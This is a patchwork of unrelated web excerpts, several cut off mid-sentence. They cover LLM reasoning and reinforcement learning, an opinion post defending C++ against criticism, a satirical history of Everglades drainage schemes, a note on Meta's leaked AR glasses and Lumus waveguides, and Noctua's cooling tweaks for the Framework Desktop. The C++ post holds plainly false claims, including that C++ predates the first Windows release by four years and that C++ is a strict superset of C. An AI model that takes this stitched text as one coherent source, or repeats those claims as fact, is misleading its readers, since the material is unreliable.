obviously false instructions. They'll spend 20 minutes "thinking" and then confidently claim an object is symmetrical when it obviously isn't. When corrected, they still can't see the error.</p><p>This isn't how humans work. Einstein never saw ARC grids, but he'd solve them instantly. Not because of prior knowledge, but because humans have consistent reasoning that transfers across domains. A logical economist becomes a logical programmer when they learn to code. They don't suddenly forget how to be consistent or deduce.</p><p>But LLMs have "dead reasoning zones" — areas in their weights where logic doesn't work. Humans have dead knowledge zones (things we don't know), but not dead reasoning zones. Asking questions outside the training distribution is almost like an adversarial attack on the model.</p><p>Neural networks learn the distribution they're trained on. Many see this as a fundamental blocker to generalization, that their skills are ossified at training time.</p><p><span>I think that's half right. Neural networks </span><em>do</em><span> only learn their training distribution. But reasoning itself can be part of that distribution. Reasoning is the generalization engine — the skill that enables acquiring all other skills.</span></p><p>The problem is how current LLMs learn reasoning. When they train on math, they learn math reasoning. When they train on code, they learn coding reasoning. But these reasoning circuits are fused with domain-specific circuits. There's some transfer (learning math reasoning helps with economics), but it's incomplete. The model doesn't fundamentally master logic itself, it masters math-logic, code-logic, writing-logic as separate skills.</p><p>It's as if humans stored a compressed kernel of deduction and logic that we call upon for everything, while LLMs store this kernel fragmented across domain-specific embeddings. They're overfitting to domain-specific reasoning patterns.</p><p>When I wrote my original ARC solution, I said "LLMs are trained with induction. They learn by predicting the next word... This makes them great at outputting words that sound correct." Looking back, it's obvious in retrospect that RL over chain-of-thought was the next step.</p><p><span>With RL, models no longer just learn what </span><em>sounds</em><span> correct based on patterns they've seen. They learn what words to output to </span><em>be</em><span> correct. RL is the process of forcing the pre-trained weights to be logically consistent.</span></p><p>We don't need models to escape their training distribution. We need to bring reasoning itself fully into that distribution. Not domain-specific reasoning, but the pure skill of logical deduction and consistency that humans apply universally. When models have consistent, transferable reasoning, we'll have AGI.</p></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>

It is call USB Connection Information (usbconnectioninformation.com) and it supports macOS 13 and up. Before launch, there were no other apps in this specific niche on the Mac App Store.

<p>C++ has often and frequently been criticized for its complexity, steep learning curve, and most of all for its ability to allow the developers using it to not only shoot themselves in the foot, but to blow off their whole leg in the process. But do these criticisms hold up under scrutiny?</p>
<p>Well, in this blog post, I aim to tackle some of the most common criticisms of C++ and provide a balanced perspective on its strengths and weaknesses.</p>
<h2 id="c-is-complex">C++ is “Complex”</h2>
<p>C++ is indeed a complex language, with a vast array of features and capabilities. For any one thing you wish to achieve in C++, there are about a dozen different ways to do it, each with its own trade-offs and implications. So, as a developer, how are you to know which approach is the best one for your specific use case? Surely you have to have a deep understanding of the language to make these decisions, right?</p>
<p><strong>Not really…</strong> I mean, don’t get me wrong, it helps, but it’s not a hard requirement. Premature optimization is the root of all evil, and in C++, you can write perfectly fine code without ever needing to worry about the more complex features of the language. You can write simple, readable, and maintainable code in C++ without ever needing to use templates, operator overloading, or any of the other more advanced features of the language.</p>
<p>There’s this idea that for everything you want to do in any programming language, you need to use the most efficient and correct approach possible. Python has this with their pythonic way of doing things, Java has this, C# has this, and Go has this. Heck, even something as simple as painting HTML onto a browser needs to be reinvented every couple of years and argued about ad nauseam. Here’s the thing, though, in most cases, there is no one right way to do something. The hallowed “best approach” is often just a matter of personal or team preference. The idea that if you just write your code in the “best” and correct way, you’ll never need to worry about maintaining it is just plain wrong.</p>
<p>Don’t worry so much about using the “best” approach; worry more about writing code that is easy to read and understand. If you do that, you’ll be fine.</p>
<h2 id="c-is-outdated">C++ is “Outdated”</h2>
<p>C++ is very old, in fact, it came out in 1985, to put it into perspective, that’s 4 years before the first version of Windows was released, and 6 years before the first version of Linux came out, or to drive the point even further home, back when the last 8-bit computer was released. So yes, C++ is quite old by any standard. But does that make it outdated?</p>
<p><strong>Hell no</strong> it’s not like C++ has just been sitting around unchanged from its 1985 release. C++ has been actively developed and improved upon for over 40 years now, with new features and capabilities being added all the time. The most recent version of the C++ standard, C++20, was released in 2020 and introduced a number of new features and improvements to the language. C++23 has introduced significant enhancements, particularly in the standard library and constexpr capabilities. Notably, concepts, ranges, and coroutines have been expanded, bringing modern programming paradigms to C++ and making the language more powerful and expressive th
an ever before.</p>
<p><strong>But Dave, what we mean by outdated is that other languages have surpassed C++ and provide a better developer experience.</strong></p>
<p>Matter of personal taste, I guess, C++ is still one of the most widely used programming languages with a huge ecosystem of libraries and tools. It’s used in a wide range of applications, from game development to high-performance computing to embedded systems. Many of the most popular and widely used software applications in the world are written in C++.</p>
<p>I don’t think C++ is outdated by any stretch of the imagination; you have to bend the definition of outdated quite a bit to make that claim.</p>
<h2 id="c-is-unsafe">C++ is “Unsafe”</h2>
<p>Ah, finally, we get to the big one, and yes, I will draw comparisons to Rust as it’s the “memory safe” language that a lot of people claim will or should replace C++.</p>
<p><strong>In fact, let’s get the main point out of the way right now.</strong></p>
<h3 id="rewrites-of-c-codebases-to-rust-always-yield-more-memory-safe-results-than-before">Rewrites of C++ codebases to Rust always yield more memory-safe results than before.</h3>
<p>Countless companies have cited how they improved their security or the amount of reported bugs or memory leaks by simply rewriting their C++ codebases in Rust.</p>
<p><strong>Now is that because of Rust?</strong> I’d argue in some small part, yes. However, I think the biggest factor is that any rewrite of an existing codebase is going to yield better results than the original codebase.</p>
<p>When you rewrite a codebase, you have the opportunity to rethink and redesign the architecture, fix bugs, and improve the overall quality of the code. You get to leverage all the lessons learned from the previous implementation, all the issues that were found and fixed, and you already know about. All the headaches that would be too much of a pain to fix in the existing codebase, you can just fix them in the new one.</p>
<p>Imagine if you will that you’ve built a shed, it was a bit wobbly, and you didn’t really understand proper wood joinery when you first built it, so it has a few other issues, like structural integrity and a leaky roof. After a few years, you build a new one, and this time you know all the mistakes you made the first time around, so you build it better, stronger, and more weatherproof. In the process, you decide to replace the materials you’ve previously used, say for example, instead of using maple, you opt for oak. Is it correct to say that the new shed is better only because you used oak instead of maple? Or is that a really small part of the overall improvement?</p>
<p>That’s how I feel when I see these companies claim that rewriting their C++ codebases in Rust has made them more memory safe. It’s not because of Rust, it’s because they took the time to rethink and redesign their codebase and implemented all the lessons learned from the previous implementation.</p>
<h3 id="but-that-does-not-deny-the-fact-that-c-is-unsafe">But that does not deny the fact that C++ is unsafe.</h3>
<p>Yes, C++ can be unsafe if you don’t know what you’re doing. But here’s the thing: all programming languages are unsafe if you don’t know what you’re doing. You can write unsafe code in Rust, you can write unsafe code in Python, you can write unsafe code in JavaScript.</p>
<p>Memory safety is just one aspect of safety in programming languages; you can still write unsafe code in memory-safe programming languages. Just using Rust will not magically make your application safe; it will just make it a lot harder to have memory leaks or safety issues.</p>
<p>The term “unsafe” is a bit too vague in this context, and I think it’s being used as a catch-all term, which to me reeks of marketing speak.</p>
<h3 id="can-c-be-made-safer">Can C++ be made safer?</h3>
<p>Yes, C++ can be made safer; in fact, it can even be made memory safe. There are a number of libraries and tools available that can help make C++ code safer, such as smart pointers, static analysis tools, and memory sanitizers. Heck, if you wish, you can even add a garbage collector to C++ if you really want to(please don’t).</p>
<p>But the easiest and most straightforward way to make C++ safer is to simply learn about smart pointers and use them wherever necessary. Smart pointers are a way to manage memory in C++ without having to manually allocate and deallocate memory. They automatically handle the memory management for you, making it much harder to have memory leaks or dangling pointers. This is the main criticism of C++ in the first place.</p>
<h2 id="c-is-hard-to-read">C++ is Hard to Read</h2>
<p>Then don’t write it that way. C++ is a multi-paradigm programming language; you can write procedural code, object-oriented code, functional code, or a mix of all three. You can write simple and readable code in C++ if you want to. You can also write complex and unreadable code in C++ if you want to. It’s all about personal or team preference.</p>
<p>Here’s a rule of thumb I like to follow for C++: make it look as much like C as you possibly can, and avoid using too many advanced features of the language unless you really need to. Use smart pointers, avoid raw pointers, and use the standard library wherever possible.</p>
<p>You can do a heck of a lot of programming by just using C++ as you would C and introducing complexity only when you really need to.</p>
<h3 id="but-doesnt-that-defeat-the-whole-purpose-of-c-why-not-just-use-c-then">But doesn’t that defeat the whole purpose of C++? Why not just use C then?</h3>
<p>C++ is a superset of C you can write C code in C++, and it will work just fine. C++ adds a lot of features and capabilities to C. If you were to start with C, then you are locked with C, and that’s fine for a lot of cases, don’t get me wrong, but C++ gives you the option to use more advanced features of the language when you need them. You can start with C and then gradually introduce C++ features as you need them. You don’t have to use all the features of C++ if you don’t want to.</p>
<p>Again, going back to my shed analogy, if you build a shed out of wood, you can always add a metal roof later if you need to. You don’t have to build the whole shed out of metal if you don’t want to.</p>
<h2 id="c-has-a-confusing-ecosystem">C++ has a confusing ecosystem</h2>
<p>C++ has a large ecosystem built over the span of 40 years or so, with a lot of different libraries and tools available. This can make it difficult to know which libraries and tools to use for a specific task. But this is not unique to C++; every programming language has this problem.</p>
<p>Again, the simple rule of thumb is to use the standard library wherever possible; it’s well-maintained and has a lot of useful features. For other tasks like networking or GUI development, there are a number of well-known libraries that are widely used and well-maintained. Do some research and find out which libraries are best suited for your specific use case.</p>
<p><strong>Avoid boost like the plague.</strong> Boost is a large collection of libraries that are widely used in the C++ community. However, many of the libraries in boost are outdated and no longer maintained. They also tend to be quite complex and difficult to use. If you can avoid using boost, do so.</p>
<p>Unless you are writing a large and complex application that requires the specific features provided by Boost, you are better off using other libraries that are more modern and easier to use. Do not add the performance overhead and binary size bloat of Boost to your application unless you really need to.</p>
<h2 id="c-is-not-a-good-choice-for-beginners">C++ is not a good choice for beginners</h2>
<p>Programming is not a good choice for beginners, woodworking is not a good choice for beginners, and car mechanics is not a good choice for beginners. Programming is hard; it takes time and effort to learn, as all things do. There is no general language that is really good for beginners; everything has its trade-offs.</p>
<p>Fact is, if you wanna get into something like <strong>systems programming or game development</strong> then starting with Python or JavaScript won’t really help you much. You will eventually need to learn C or C++.</p>
<p>If your goal is to become a web developer or data scientist, then start with Python or JavaScript.</p>
<p>If you just want a job in the programming industry, I don’t know, learn Java or C#, both great languages that get a lot of undeserved hate, but offer a lot of job opportunities.</p>
<p>Look, here’s the thing: if you’re just starting out in programming, yeah, it’s gonna be hard no matter what language you choose. I’d actually argue that starting with C or C++ is far better than starting with something that obscures a lot of the underlying concepts of programming, I’d argue further that by starting with Python or Javascript you are doing yourself a disservice in the long run and trading off the pain of learning something when your understanding of a topic is still fresh and malleable for the pain of learning something later when you have a lot more invested in your current understanding of programming.</p>
<p>But hey, that’s just my opinion.</p>
<h2 id="c-vs-rust-friends-or-rivals">C++ vs Rust: Friends or Rivals?</h2>
<p>Rust has earned a lot of love in recent years, and for good reason. It takes memory safety seriously, and its borrow checker enforces discipline that C++ often leaves to the programmer. That said, Rust is still building its ecosystem, and the learning curve can feel just as steep — just in different ways. C++ may not prevent you from shooting yourself in the foot, but it gives you decades of battle-tested tooling, compilers, and libraries that power everything from Chrome to Unreal Engine. In practice, many teams use Rust and C++ together rather than treating them as enemies. Rust shines in new projects where safety is the priority, while C++ continues to dominate legacy systems and performance-critical domains.</p>
<h2 id="is-c-still-used-in-2025">Is C++ Still Used in 2025?</h2>
<p>The short answer: absolutely. Despite the constant chatter that it’s outdated, C++ remains one of the most widely used languages in the world. Major browsers like Chrome and Firefox are still written in it. Game engines like Unreal run on it. Automotive systems, financial trading platforms, and even AI frameworks lean heavily on C++ for performance and control. New standards (C++20, C++23) keep modernizing the language, ensuring it stays competitive with younger alternatives. If you peel back the layers of most large-scale systems we rely on daily, you’ll almost always find C++ humming away under the hood.</p>
<h2 id="conclusion">Conclusion</h2>
<p>C++ is a powerful and versatile programming language that has stood the test of time. While it does have its complexities and challenges, it remains a relevant and widely used language in today’s tech landscape.
With the right approach and mindset, C++ can be a joy to work with and can yield high-performance and efficient applications. So next time you hear someone criticize C++, take a moment to consider the strengths and capabilities of this venerable language before dismissing it outright.</p>

Don’t we like the Everglades? Don’t we like wetlands?</p><p>Well, yes, but back then, people thought this land was “absolutely valueless in its natural condition.” With regards to the Everglades, people thought it was straight garbage, yuck factor x100, please drain it as soon as you can so I can start growing cotton and tobacco on it, thanks very much.</p><p>According to historian Christopher Meindl, "From the middle of the nineteenth century to the middle of the twentieth century, the United States went through a period in which wetland removal was not questioned. Indeed, it was considered the proper thing to do.”</p><p>So yeah, people hated wetlands. People wanted ‘em gone.</p><p>Floridians have been chomping at the bit to catastrophically alter one of the country’s greatest natural resources since before Florida even became a state.</p><p>One guy went to the Everglades in 1837, and instead of coming home and saying “Why, heavens, the sawgrass prairies were the most enchanting thing mine eyes have ever rested upon,” or however they talked back then, he had the following to say:</p><blockquote><p>Could it be drained by deepening the natural outlets? Would it not open to cultivation immense tracts of rich vegetable soil? … Would such draining render the country unhealthy? … Could the waters be lowered ten feet, it would probably drain six hundred thousand acres; should this prove to be a rich soil, as would seem probable, what a field it would open for tropical productions! What facilities for commerce!</p></blockquote><p>The U.S. Congress clearly agreed with that “What facilities for commerce!” part, because in 1842, they asked for a report on “the practicability and probable expense of draining the everglades of Florida.”</p><p>That report, the first published study about the Everglades, said, “The Ever Glades are now suitable only for the haunt of noxious vermin or the resort of pestilent reptiles,” so in other words, they were super on board with the idea of draining it, too.</p><div data-attrs="{&quot;url&quot;:&quot;https://rabbitcavern.substack.com/p/should-we-drain-the-everglades?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;}" data-component-name="CaptionedButtonToDOM"><p><strong>Share with a friend whose living space could be accurately described as “the haunt of noxious vermin or the resort of pestilent reptiles” (we all have one)</strong></p><p data-attrs="{&quot;url&quot;:&quot;https://rabbitcavern.substack.com/p/should-we-drain-the-everglades?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;}" data-component-name="ButtonCreateButton"><a href="https://rabbitcavern.substack.com/p/should-we-drain-the-everglades?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p></div><p>The first attempt to drain the Everglades was undertaken by a guy named Hamilton Disston.</p><p><span>In 1881, Hamilton purchased 4,000,000 acres (16,000 km2) of land at 25 cents per acre, an area larger than the state of Connecticut and reported to encompass “</span><a href="https://www.google.com/books/edition/Mirage/eJNFDwAAQBAJ?hl=en&amp;gbpv=1" rel="">nearly half of Florida</a><span>” at the time.</span></p><p>The New York Times described this as “What is claimed to be the largest purchase of land ever made by a single person in the world,” which is pretty much how I felt when I signed the lease on my first college apartment.</p><p>Hamilton wasted no time in “implementing his ambitious plan to drain an area the size of a small state.” This plan was “launched with great enthusiasm but little scientific understanding or inquiry,” which is a theme you will see repeated numerous times throughout this post.</p><p>Everything seemed to be going great at first – the drainage canals Hamilton built were working as intended and water levels were decreasing. However, this illusion of success all took place during Florida’s dry season.</p><p>Once the wet season came along, it became clear that all this water wasn’t going anywhere. The wetlands would remain wet as hell.</p><p>Thankfully, though, it doesn’t sound like all this water caused any catastrophic flooding in the surrounding communities, which is really great and definitely isn’t going to be how it always goes for those poor fuckers.</p><p>Unfortunately for Hamilton, his plan was a failure and he was forced to sell a lot of his land at a loss. Fortunately for literally everyone else, his huge land purchase got everyone really excited about the idea of going to Florida, which led to a boom in tourism and land value.</p><p>The second attempt to drain the Everglades was made by Napoleon Bonaparte Broward, a man with a very cool name who became governor of Florida after campaigning primarily on the issue of draining the Everglades.</p><p>Here’s Broward selling himself to voters:</p><blockquote><p>"It would indeed be a commentary on the intelligence and energy of the State of Florida to confess that so simple an engineering feat as the drainage of a body of land above the sea was above their power.”</p></blockquote><p>A commentary on their intelligence indeed.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!tRQl!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!tRQl!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 424w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 848w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 1272w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!tRQl!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png" width="1108" height="162" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:162,&quot;width&quot;:1108,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!tRQl!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 424w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 848w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 1272w, https://substackcdn.com/image/fetch/$s_!tRQl!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec2e6d62-f354-457f-b55d-49c3d2652000_1108x162.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>In fact, water naturally flows from Lake Okeechobee to the ocean at a rate of only </span><strong>half a mile a day </strong><span>(0.8km).

So to boost the credibility of Wright’s report, the industry “energetically misrepresented this mid-level engineer as the world's foremost authority on wetlands drainage.”</p><p>However, the report had some really huge errors, and one of Wright’s colleagues would later testify to the U.S. House of Representatives, “I regard Mr. Wright as absolutely and completely incompetent for any engineering work.” Which is all a very long way of saying that this plan didn’t work either.</p><p>Anyway, real estate still got even more valuable after all this, and they named Broward County for failed Everglades drainer Napoleon Bonaparte Broward, so things worked out okay for everyone in the end.</p><p>More on that “real estate got really expensive” part - developers sold tens of thousands of plots to unsuspecting people who drained their bank accounts only to show up in Florida and find their brand new land underwater. Uh oh!</p><p>These people had been promised land that could yield crops within eight weeks of arrival, but for some of them, it took over two months for their land to simply not be underwater anymore. Oops!</p><p>Unfortunately for these newly minted Floridians, things would go from bad to worse.</p><p>Once the water drained from their land, all their animals and equipment got stuck in the mud.</p><p><span>Once the mud dried, it turned to a fine black powder and created nasty dust storms (assuming it didn’t burn up in a </span><a href="https://www.youtube.com/watch?v=y26ozKSmahc&amp;pp=ygUJbXVjayBmaXJl" rel="">muck fire</a><span> first).</span></p><p>These poor souls couldn’t farm anything and also had to deal with mosquitoes, snakes, and alligators.

The Port Authority, however, was undeterred:</p><blockquote><p>At first, the Port Authority laughed the conservationists off as "butterfly chasers." In an interview, the Deputy Director stated, "regardless of what the environmental plan might dictate, however, [w]e're going to build the jetport.”</p></blockquote><p>But the pressure from the “butterfly chasers” was effective, and the Department of the Interior ordered a study looking at the potential impacts of the new airport.</p><p><span>(Fun fact: this was </span><a href="https://www.nps.gov/bicy/learn/historyculture/worlds-largest-jetport.htm" rel="">first ever environmental impact study conducted in the state of Florida</a><span>. Does Florida still do those? Honestly who knows)</span></p><p>The Department of the Interior took one look at the airport plan and said, “Development of the proposed jetport and its attendant facilities ... will inexorably destroy the south Florida ecosystem and thus the Everglades National Park,” to which the director of the Dade County Port Authority responded, “I'm more interested in people than alligators. This is the ideal place as far as aviation is concerned.”</p><p>Many national politicians also came out against the plan, including Wisconsin’s Senator Gaylord Nelson, who said, “Either we stop the jetport at the present site, or we publicly admit that we are going to destroy the park.”</p><p>For a second, it seemed like “destroy the park” was the option they were going to go with, but then Richard Nixon of all people stepped in to nix the plan and establish Big Cypress National Preserve instead.</p><p>Construction was halted after just one runway was completed. This runway was used by Pan Am and Eastern Airlines to train their pilots until eventually flight simulators came along and the runway was mostly useless again.</p><p>What remained was Dade-Collier Training and Transition Airport, an obscure runway in the middle of nowhere that only saw about 39 flights per day as of 2018.</p><p>So in the end, the big crazy airport ended up being basically nothing at all. Anyway, what’s it being used for today? Hopefully nothing insane, right? Hopefully nothing that advances a dystopian fascist agenda, right?

<div id="readability-page-1" class="page"><div>
			
<h2>Introduction</h2>



<p>Just a short note today. I’m in the middle of my trip, which will end in Eindhoven next week (see notice at the end of this article), when I heard that Meta had leaked a video on YouTube of its Monocular AR glasses, which are expected to be disclosed at Meta Connect tomorrow, September 17th at 5 PM PST, at Mark Zuckerberg’s Keynote. Although the original leaked video on YouTube has been removed, multiple copies were captured before it was taken down. </p>



<p>This blog reported on May 11, 2025, that it was likely that Meta was using a Lumus waveguide for their upcoming AR glasses product codenamed Hypernova (see:  <a href="https://kguttag.com/2025/05/11/meta-hypernova-and-google-ar-ai-glasses-lumus-avegant-inside-both-using-lcos-microdisplays/#Hypernova-lumus">Meta’s Hypernova Optics – Likely a Lumus Z-Lens Variant</a>). While the codename for the AR glasses was Hypernova, the product is expected to be named Celest. Bloomberg has reported that the Celest AR glasses are supposed to cost about $800 for the base model without prescription correction. </p>



<h2>Evidence of Lumus Z-Like Waveguide in the Video</h2>



<p>Below left is a still frame I captured from the video, which shows the diagonal “slats” that form part of Lumus 2-D pupil expansion. This video appears to be a rotating 3-D model, so I was a bit surprised that they showed the slate details. </p>







<p>The 3-D model makes them appear much more visible than they appear in real life. On May 21, 2025, I identified similar pupil expansion slats in Rivet’s AR glasses in “<a href="https://kguttag.com/2025/05/21/exclusive-rivet-industries-using-lumus-waveguides-for-military-industrial-ar/">Exclusive: Rivet Industries Using Lumus Waveguides for Military &amp; Industrial AR</a>.” The images above, middle and far right, compare the Rivet AR glasses to a Lumus Z-Lens waveguide. There is clear evidence that Lumus is being utilized in both Meta’s first AR consumer product and Rivet’s military AR glasses.</p>



<h2>In Closing: Be Looking for the Lumus Waveguide in Mark Zuckerberg’s Meta Connect Keynote </h2>



<p>I’m likely to be able to see when Zuckerberg gives his live presentation on the 17th. It is assumed that he will showcase the Celest glasses. Hopefully, you will be able to spot the Lumus waveguides when he puts the glasses on. </p>







<h2><span>MicroLED-AR/VR Connect In Eindhoven, Netherlands, September 23-25</span></h2>



<p>I’ve been asked to speak at and partner with the joint&nbsp;<strong>MicroLED and AR/VR Connect</strong>&nbsp;conference and exhibition in Eindhoven, the Netherlands, on September 23-25, 2025.

            <description><![CDATA[<p>URL: <a href="https://noctua.at/en/how-to-make-the-framework-desktop-run-even-quieter">https://noctua.at/en/how-to-make-the-framework-desktop-run-even-quieter</a>, See on <a href="https://news.ycombinator.com/item?id=45266039">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Not so long ago, the compact, small form factor PC segment witnessed a significant refreshment with the launch of the <a href="https://frame.work/">Framework</a> desktop PC. If you've missed it and are wondering why this mini-PC is considered so special, it's because it was the first desktop PC to utilise the <a href="https://www.amd.com/en/products/processors/laptop/ryzen/ai-300-series/amd-ryzen-ai-max-385.html">AMD Ryzen AI Max APU</a>, a processor previously exclusive to laptops.</p>
<p>The AMD Ryzen AI Max processor stands out for its exceptional speed and integrated graphics performance, frequently surprising users with its gaming capabilities, even on demanding titles. Users often highlight its powerful integrated GPU, which can leverage a massive memory pool (up to 96GB for AI tasks), allowing it to efficiently handle complex AI and deep learning workloads. The raw performance delivered by this chip makes it a worthwhile choice for intensive tasks and creative workflows.</p>
<p>As a collaborator and partner on the Framework Desktop mini-PC project, our first steps involved integrating our <a href="https://noctua.at/en/nf-a12x15-pwm">NF-A12x25</a> fan and a fan duct. This way, we could significantly reduce system noise levels while ensuring safe operating temperatures – you can <a href="https://noctua.at/en/noctua-cooling-enhancements-to-framework-desktop">read more about this here</a>. But can the Framework Desktop be made even quieter? We wanted to leave no stone unturned to find out, so we took it a step further by trying to integrate our signature Noctua fan grill design that debuted on the <a href="https://noctua.at/en/seasonic-prime-tx-1600-noctua-edition">Seasonic Prime TX-1600 Noctua Edition power supply</a>.</p>
<p><img src="https://noctua.at/pub/media/wysiwyg/framework_desktop_noctua_intake_fan_duct.jpg" alt="Framework Desktop PC Fan Intake Noctua Designed Duct" width="650" height="433"></p>
<p>It must be noted that customer safety and EMC requirements for the mini PC, a standalone electrical item, differ from those for hardware components (such as the PSU) designed to be inside a PC case. The safety standard suggests that ventilation openings on case side panels need to be less than 5mm in diameter. To comply with safety regulations, we created an updated version of the original fan grille as implemented on the <a href="https://noctua.at/en/seasonic-prime-tx-1600-noctua-edition">Seasonic Prime TX 1600 Noctua Edition</a> power supply featuring more struts and a smaller opening size, ensuring full adherence to these standards. To complement the new grille design, we have also designed a custom, funnel shaped fan duct that makes maximum use of the outermost openings of the custom side panel.</p>
<p><img src="https://noctua.at/pub/media/wysiwyg/framework_desktop_noctua_3D_print_intake_fan_grill_installation.jpg" alt="3D printed Noctua Signature grill sidepanel for Framework PC" width="650" height="433"></p>
<p>In combination, the custom side panel and duct design provided a massive noise reduction compared to the stock configuration, particularly in lower fan speed ranges. We have measured around 7 dB(A) lower noise levels at around 50% fan speed, and up to 5 dB(A) lower at higher fan speeds, when compared at the same APU operating temperature.</p>
<p><img src="https://noctua.at/pub/media/wysiwyg/Framework_desktop_fan_grill_comparison.jpg" alt="Stock vs Noctua Framework Desktop grill temperature comparison" width="650" height="451"></p>
<p>While the custom side panel with our signature Noctua grill as well as the custom fan duct are not slated for mass production at this point, we are more than happy to share the 3D CAD files for everyone who is looking to make their Framework Desktop run even quieter.</p>
<p>Both the custom side panel and the customised fan ductare available to download at <a href="https://www.printables.com/@Noctua/models">Printables.com</a> for you to 3D-print at home:</p>
<ul>
<li><a href="https://www.printables.com/model/1368247-framework-destktop-side-panel-with-noctua-style-fa">Custom side panel with Noctua-style fan grill</a></li>
<li><a href="https://www.printables.com/model/1368249-framework-desktop-custom-fan-duct">Custom fan duct to make best use of the custom side panel</a></li>

<p>Fortunately, the quality of 3D printing technologies has advanced so much that you can end up with a nice, clean side panel, which will additionally optimise the sound profile, or bring your APU temperatures down significantly.</p>

<p>In addition to redesigning and testing the Noctua fan grill, we also evaluated various other scenarios. These included replacing the NF-A12x25 with its G2 variant and incorporating an additional 8cm fan for exhaust purposes. The findings of these tests may prove surprising. The additional <a href="https://noctua.at/en/nf-a8-pwm">NF-A8 PWM</a> fan, which was added as an exhaust fan at the front of the case, yielded slightly lower temperatures, but at the expense of extra noise emission, so it’s not a setup that we would recommend from a performance-to-noise efficiency point of view.</p>

<p>While upgrading to an <a href="https://noctua.at/en/nf-a12x25-g2-pwm">NF-A12x25 G2</a> does provide some acoustical benefits compared to the stock setup (around 1 to 1.5 dB(A) lower noise levels at the same temperatures), its maximum speed is limited to 1800 RPM, so it cannot match the performance headroom of the 2400 RPM HS-PWM version of the NF-A12x25 that is supplied with the Framework Desktop PC. This high-speed version of the „G1“ fan is a safeguard that ensures the system can maintain full performance in worst-case conditions with high ambient temperatures. In other words, we would only recommend upgrading to the <a href="https://noctua.at/en/nf-a12x25-g2-pwm">NF-A12x25 G2</a> if you seek to lower noise levels as much as possible and if you are willing to sacrifice the maximum performance headroom in worst-case scenarios that the G1 HS-PWM fan provides.</p>

<p>In summary, after a lot of simulation, experimenting and testing, we can conclude that not all tweaks to the <a href="https://frame.work/si/en/desktop">Framework Desktop’s</a> cooling setup make sense. However, if you have access to a 3D printer, swapping the stock side panel and fan duct for the custom designed ones can help to make your unit run significantly quieter.</p>
